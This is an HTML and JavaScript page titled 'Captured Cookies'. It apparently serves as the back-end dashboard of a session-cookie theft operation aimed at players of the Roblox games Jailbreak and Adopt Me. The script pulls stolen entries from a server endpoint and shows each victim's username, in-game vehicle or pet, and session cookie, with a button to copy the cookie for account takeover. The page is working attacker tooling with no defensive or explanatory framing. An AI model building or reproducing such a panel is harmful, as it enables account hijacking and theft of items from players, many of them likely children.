<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Cookies</title>
    <style>
        :root {
            --bg: #0d1117;
            --surface: #161b22;
            --border: rgba(255,255,255,0.06);
            --text: #c9d1d9;
            --blue: #3a6ea5;
            --pink: #d6336c;
            --green: #3fb950;
        }
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            padding: 24px;
            display: flex;
            justify-content: center;
        }
        .container {
            width: 100%;
            max-width: 950px;
            display: flex;
            flex-direction: column;
            gap: 24px;
        }
        .header {
            display: flex;
            align-items: center;
            gap: 14px;
        }
        .header h1 {
            font-size: 28px;
            font-weight: 700;
            color: #fff;
        }
        .refresh-btn {
            background: var(--blue);
            border: none;
            padding: 8px 18px;
            border-radius: 20px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
        }
        .refresh-btn:hover { background: #4b82b8; }
        .tabs {
            display: flex;
            gap: 8px;
            border-bottom: 1px solid var(--border);
            padding-bottom: 12px;
        }
        .tab {
            padding: 8px 22px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
            background: transparent;
            border: 1px solid #30363d;
            color: #8b949e;
        }
        .tab.active {
            background: var(--blue);
            color: white;
            border-color: var(--blue);
        }
        .card {
            background: var(--surface);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 18px;
        }
        .entry {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 0;
            border-bottom: 1px solid var(--border);
            gap: 16px;
            flex-wrap: wrap;
        }
        .entry:last-child { border-bottom: none; }
        .entry-info strong {
            color: #fff;
            font-size: 14px;
        }
        .entry-info span {
            display: block;
            font-size: 12px;
            color: #8b949e;
            margin-top: 2px;
        }
        .cookie-box {
            font-family: monospace;
            font-size: 13px;
            color: #c9d1d9;
            background: #0d1117;
            padding: 6px 10px;
            border-radius: 6px;
            max-width: 280px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }
        .copy-btn {
            background: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
            padding: 6px 14px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            font-weight: 600;
            transition: 0.2s;
        }
        .copy-btn:hover { background: #30363d; }
        .empty {
            text-align: center;
            color: #8b949e;
            padding: 40px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📦 Captured Cookies</h1>
            <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
        </div>

        <div class="tabs">
            <div class="tab active" data-tab="jailbreak">Jailbreak</div>
            <div class="tab" data-tab="adoptme">Adopt Me</div>
        </div>

        <div id="content" class="card">
            Loading...
        </div>
    </div>

    <script>
        let currentTab = 'jailbreak';
        let allData = { jailbreak: [], adoptme: [] };

        async function loadData() {
            document.getElementById('content').innerHTML = 'Loading...';
            try {
                const res = await fetch('/api/cookies');
                allData = await res.json();
                renderTab();
            } catch (err) {
                document.getElementById('content').innerHTML = '<div class="empty">Could not connect to server.</div>';
            }
        }

        function renderTab() {
            const data = allData[currentTab] || [];
            const container = document.getElementById('content');
            if (!data.length) {
                container.innerHTML = '<div class="empty">No entries yet.</div>';
                return;
            }
            let html = '';
            data.forEach(entry => {
                const detail = currentTab === 'jailbreak' ? `Vehicle: ${entry.vehicle || 'N/A'}` : `Pet: ${entry.pet || 'N/A'}`;
                html += `
                    <div class="entry">
                        <div class="entry-info">
                            <strong>Username: ${entry.username}</strong>
                            <span>${detail}</span>
                        </div>
                        <div class="cookie-box" title="${entry.cookie}">${(entry.cookie || '').substring(0, 45)}...</div>
                        <button class="copy-btn" data-cookie="${escapeAttr(entry.cookie)}">📋 Copy</button>
                    </div>
                `;
            });
            container.innerHTML = html;
            // Attach copy events
            document.querySelectorAll('.copy-btn').forEach(btn => {
                btn.addEventListener('click', (e) => {
                    const cookie = btn.getAttribute('data-cookie');
                    navigator.clipboard.writeText(cookie).then(() => {
                        btn.textContent = '✔ Copied';
                        setTimeout(() => { btn.textContent = '📋 Copy'; }, 2000);
                    });
                });
            });
        }

        function escapeAttr(str) {
            return str.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
        }

        // Tab switching
        document.querySelectorAll('.tab').forEach(tab => {
            tab.addEventListener('click', () => {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                tab.classList.add('active');
                currentTab = tab.dataset.tab;
                renderTab();
            });
        });

        // Initial load
        loadData();
    </script>
</body>
</html>
